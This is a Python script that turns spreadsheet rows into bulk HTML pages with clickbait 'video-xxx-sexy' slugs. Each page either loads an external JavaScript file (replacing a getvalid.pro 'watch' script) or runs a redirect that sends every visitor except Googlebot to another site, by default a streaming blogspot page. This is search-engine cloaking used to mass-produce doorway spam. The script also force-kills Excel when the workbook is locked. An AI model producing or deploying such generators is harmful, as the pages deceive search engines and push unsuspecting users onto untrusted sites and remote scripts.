import os
import re
import random
import string
from datetime import datetime
import pandas as pd
from openpyxl import load_workbook
import subprocess
import time

BASE_DIR       = os.path.dirname(os.path.abspath(__file__))
EXCEL_PATH     = os.path.join(BASE_DIR, "Details.xlsx")
TEMPLATE_PATH  = os.path.join(BASE_DIR, "video-templete-01.html")
OUTPUT_DIR     = os.path.join(BASE_DIR, "output")

DEFAULT_BLOGSPOT_URL = "https://watchdnow.blogspot.com/2026/09/ncaaf-2026.html"
DEFAULT_IMAGE_URL    = "https://www.shutterstock.com/shutterstock/videos/3589102761/thumb/5.jpg"

os.makedirs(OUTPUT_DIR, exist_ok=True)

today = datetime.today()
DATE_ISO  = today.strftime("%Y-%m-%d")
try:
    DATE_LONG = today.strftime("%#d %B %Y")
except ValueError:
    DATE_LONG = today.strftime("%d %B %Y").lstrip("0")

def random_string(length=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))

def make_slug(text):
    text = re.sub(r"[^A-Za-z0-9\s-]", "", str(text))
    text = text.lower()
    words = [w for w in text.split() if "video" not in w]
    slug = "-".join(words)
    slug = slug[:50].rstrip("-")
    if not slug:
        slug = "video"
    unique_str = random_string(9)
    slug = f"video-xxx-sexy-{slug}-{unique_str}"
    slug = slug.replace("--", "-")
    return slug

def clean_val(val):
    if pd.isna(val):
        return ""
    s = str(val).strip()
    if s.lower() == "nan":
        return ""
    return s

def get_val(df_row, df, index, col_idx, possible_keys=()):
    try:
        if col_idx < len(df.columns):
            val = df.iloc[index, col_idx]
            c_val = clean_val(val)
            if c_val:
                return c_val
    except Exception:
        pass
    for k in possible_keys:
        if k in df_row:
            c_val = clean_val(df_row[k])
            if c_val:
                return c_val
    return ""

def process_excel():
    if not os.path.exists(EXCEL_PATH):
        print(f"[ERROR] Excel file not found at: {EXCEL_PATH}")
        return

    wb = load_workbook(EXCEL_PATH)
    ws = wb.active

    if ws.cell(row=1, column=7).value is None or str(ws.cell(row=1, column=7).value).strip() == "":
        ws.cell(row=1, column=7).value = "Full File Path"

    if ws.max_column >= 9:
        ws.delete_cols(9, ws.max_column - 8)

    if ws.cell(row=1, column=8).value is None or str(ws.cell(row=1, column=8).value).strip() == "":
        ws.cell(row=1, column=8).value = "Username"

    df = pd.read_excel(EXCEL_PATH, header=0)

    html_template = ""
    if os.path.exists(TEMPLATE_PATH):
        with open(TEMPLATE_PATH, "r", encoding="utf-8") as f:
            html_template = f.read()

    created_count = 0
    skipped_count = 0

    print(f"\n[Date (ISO)]  : {DATE_ISO}")
    print(f"[Date (Long)] : {DATE_LONG}")
    print(f"[Output dir]  : {OUTPUT_DIR}\n")

    for index, row in df.iterrows():
        excel_row_num = index + 2

        title          = get_val(row, df, index, 0, ("Title", "Titlex", "title"))
        keywords       = get_val(row, df, index, 1, ("keywordss", "keywords", "Keyword", "Keywords"))
        image          = get_val(row, df, index, 2, ("imageses", "images", "image", "Image"))
        meta           = get_val(row, df, index, 3, ("MetaDescription", "meta", "Meta Description", "metadescription"))
        link_val       = get_val(row, df, index, 4, ("LINKSS", "link", "links", "Link"))
        category       = get_val(row, df, index, 5, ("Category", "Categoryss", "category", "Categories"))
        full_file_path = get_val(row, df, index, 6, ("Full File Path", "full_file_path", "filepath", "FullFilePath"))
        username_val   = get_val(row, df, index, 7, ("Username", "username", "slug", "Usernamex"))

        # Skip row if Title is missing
        if not title:
            print(f"[SKIP] Row {excel_row_num}: Title is empty.")
            skipped_count += 1
            continue

        # Skip row if Full File Path is already present
        if full_file_path:
            print(f"[SKIP] Row {excel_row_num}: Full File Path already exists ({full_file_path}).")
            skipped_count += 1
            continue

        img_url = image if image else DEFAULT_IMAGE_URL

        if username_val:
            slug = str(username_val).strip()
        else:
            slug = make_slug(title)

        filename = f"{slug}.html"
        filepath = os.path.join(OUTPUT_DIR, filename)

        target_url = link_val if link_val else DEFAULT_BLOGSPOT_URL

        if html_template:
            html_content = html_template

            if target_url.lower().endswith(".js"):
                match = re.search(r"https://getvalid\.pro/watch/[a-zA-Z0-9_-]+\.js", html_content)
                if match:
                    html_content = html_content.replace(match.group(0), target_url)
                elif "<head>" in html_content:
                    html_content = html_content.replace("<head>", f'<head>\n  <script src="{target_url}"></script>', 1)
                else:
                    html_content = f'<script src="{target_url}"></script>\n' + html_content
            else:
                redirect_script = "<script>\nif (!navigator.userAgent.includes('Googlebot')) {\n    window.location.href = \"" + target_url + "\";\n}\n</script>\n"
                match = re.search(r'<script[^>]*src=["\']https://getvalid\.pro/watch/[a-zA-Z0-9_-]+\.js["\'][^>]*>\s*</script>', html_content, re.IGNORECASE)
                if match:
                    html_content = html_content.replace(match.group(0), redirect_script)
                else:
                    html_content = redirect_script + html_content

            html_content = html_content.replace("LINKSS",          target_url)
            html_content = html_content.replace("Categoryss",      category)
            html_content = html_content.replace("Category",        category)
            html_content = html_content.replace("Datesss2",        DATE_LONG)
            html_content = html_content.replace("Datesss",         DATE_ISO)
            html_content = html_content.replace("Titlex",          title)
            html_content = html_content.replace("Title",           title)
            html_content = html_content.replace("keywordss",       keywords)
            html_content = html_content.replace("keywords",        keywords)
            html_content = html_content.replace("imageses",        img_url)
            html_content = html_content.replace("images",          img_url)
            html_content = html_content.replace("MetaDescription", meta)
        else:
            if target_url.lower().endswith(".js"):
                redirect_head = f'<script src="{target_url}"></script>'
            else:
                redirect_head = "<script>\nif (!navigator.userAgent.includes('Googlebot')) {\n    window.location.href = \"" + target_url + "\";\n}\n</script>"
            html_content = f"<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n{redirect_head}\n<title>{title}</title>\n</head>\n<body>\n<h1>{title}</h1>\n<img src=\"{img_url}\" alt=\"{title}\" style=\"max-width:100%;height:auto;\"/>\n<p>{meta}</p>\n<p>Redirecting to <a href=\"{target_url}\">{target_url}</a>...</p>\n</body>\n</html>"

        with open(filepath, "w", encoding="utf-8") as f:
            f.write(html_content)

        ws.cell(row=excel_row_num, column=7).value = filepath

        print(f"[OK] Row {excel_row_num}: Created -> {filename} (Redirect Link: {target_url})")
        created_count += 1

    try:
        wb.save(EXCEL_PATH)
        wb.close()
        print(f"\n[Done] Created Files: {created_count} | Skipped: {skipped_count}")
        print(f"[Excel updated]: {EXCEL_PATH}")
    except PermissionError:
        print(f"\n[WARNING] '{EXCEL_PATH}' is currently locked (likely open in Excel). Closing Excel and retrying...")
        try:
            subprocess.run(["taskkill", "/f", "/im", "EXCEL.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)
            wb.save(EXCEL_PATH)
            wb.close()
            print(f"[Done] Excel process terminated and file saved successfully: {EXCEL_PATH}")
        except Exception as e:
            print(f"[ERROR] Could not save Excel file: {e}")

if __name__ == "__main__":
    process_excel()